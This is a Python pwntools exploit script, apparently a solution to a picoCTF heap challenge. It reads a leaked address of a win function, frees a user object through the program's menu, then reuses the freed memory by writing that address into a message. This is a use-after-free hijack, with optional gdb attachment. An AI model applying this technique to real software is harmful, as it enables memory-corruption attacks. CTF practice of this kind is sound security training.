#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./vuln", checksec=False)

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

REMOTE = ("mercury.picoctf.net", 48259)

args.local = True
args.debug = True
if args.local == False:
    args.debug = False 


class Exploit:
    def __init__(self):
        if args.local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"
        self.debug = args.debug

    def conn(self, proc: process):
        '''
        Welcome to my stream! ^W^
        ==========================
        (S)ubscribe to my channel
        (I)nquire about account deletion
        (M)ake an Twixer account
        (P)ay for premium membership
        (l)eave a message(with or without logging in)
        (e)xit
        '''
        p = proc.recvuntil(b"(e)xit\n")
        p = proc.sendline(b"s")
        '''get memory leak address of hahaexploitgobrrr function'''
        p = proc.recvuntil(b"OOP! Memory leak...0x")
        p: bytes = proc.recvline().decode()
        '''I don't know why he is leaking this static address'''
        leaked_flag_address = int(p.strip(), 16) 
        print(hex(leaked_flag_address)) # 0x80487d6
        p = proc.sendafter(b"(e)xit\n", b"i\ny\n") # free
        p = proc.sendafter(b"(e)xit\n", b"l") # 
        p = proc.sendline(pack("<Q", leaked_flag_address))
        return

    def start(self):
        '''start the exploit'''
        proc: process = eval(self.process)
        if self.debug:
            script = """
            # source /usr/share/pwndbg/gdbinit.py
            # source /usr/share/peda/peda.py
            source /usr/share/gef/gef.py

            set step-mode on
            set pagination off
            set logging off
            
            break *i+123
            break leaveMessage
            # break s
            # break hahaexploitgobrrr
            # break *main+92
            continue
            heap chunks
            """
            gdb.attach(proc, gdbscript=script)
        self.conn(proc)
        proc.interactive()
        proc.close()


if __name__ == "__main__":
    Exploit().start()
